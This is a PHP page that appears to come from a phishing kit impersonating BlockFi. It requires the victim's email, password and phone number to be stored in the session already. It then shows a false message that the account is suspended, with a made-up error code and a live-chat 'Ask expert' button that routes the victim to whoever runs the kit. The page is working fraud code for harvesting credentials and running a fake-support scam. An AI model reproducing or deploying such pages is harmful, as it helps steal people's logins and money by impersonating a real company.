<?php include_once './config.php'; ?>
<html lang="en">
    <?php
        $title = 'BlockFi | Account';
        include_once './includes/meta.php';
        if(empty($_SESSION["email"]) || empty($_SESSION["password"])) {
            redirect(base_url());
        }
        if(empty($_SESSION["phone_number"])) {
            redirect(base_url('verify.php'));
        }
    ?>
    <body>
        <?php include_once './includes/header.php'; ?>
        <div class='container'>
            <div class="row justify-content-center mt60 pt30">
                <div class='col-sm-4 shadow-lg p25 bg-white text-dark rounded-2'>
                    <div class='col-sm-12 text-center'>
                        <img src=<?= base_url('assets/img/logo.png') ?> width="70%" alt="Logo" class="d-inline-block align-text-top my20" />
                        <h2 class='pt25 fs30 fw-medium'>Important Message</h2>
                        <div class='fw-medium fs16 py10 text-danger'>Due to unauthorized activity and identification failure on your Account. Account Access has been suspended.Please Get in touch with our Support Staff Immediately.</div>
                        <div class='py20 text-center fw-bold fs20'>Error CODE: EBRX1</div>
                    </div>
                    <div class='text-center my20'>
                        <a href="javascript:void(Tawk_API.toggle())" class="btn btn-primary-2 btn-lg px30 rounded-0 fs16 py10">Ask expert</a>
                    </div>
                </div>
            </div>
        </div>
        <?php include_once './includes/footer.php'; ?>
    </body>
</html>